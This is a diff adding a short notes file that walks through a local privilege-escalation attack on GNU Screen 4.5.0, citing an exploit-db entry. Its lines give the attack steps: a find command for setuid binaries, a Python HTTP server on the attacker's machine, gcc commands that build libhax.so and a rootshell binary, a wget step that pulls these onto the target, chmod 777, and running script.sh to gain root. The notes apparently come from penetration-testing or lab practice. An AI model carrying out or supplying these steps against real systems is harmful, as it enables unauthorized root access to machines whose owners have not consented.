@@ -1,0 +1,23 @@
+https://www.exploit-db.com/exploits/41154 for reference
+
+if screen 4.5.0 is in the setuid binaries(find / -perm -u=s -type f 2>/dev/null) you can try to priv esc locally without metasploit
+
+to do this you need to start a python server: sudo python -m SimpleHTTPServer 80 in the directory with these files
+
+from there make sure you upload all thre files: rootshell, libhax.so, and script.sh
+
+if these are unavailable you can just recompile the libhax.c and the rootshell.c files using the commands below:
+libhax.so ----> gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rootshell ----> gcc -o /tmp/rootshell /tmp/rootshell.c
+
+this should create both those files
+
+no need to compile the sh script because it is bash
+
+but yeah after you're all sorted and have your files made you can wget them from the target machine
+
+chmod 777 each file
+
+then run ./script.sh
+
+after running this you should be able to get root!!!!
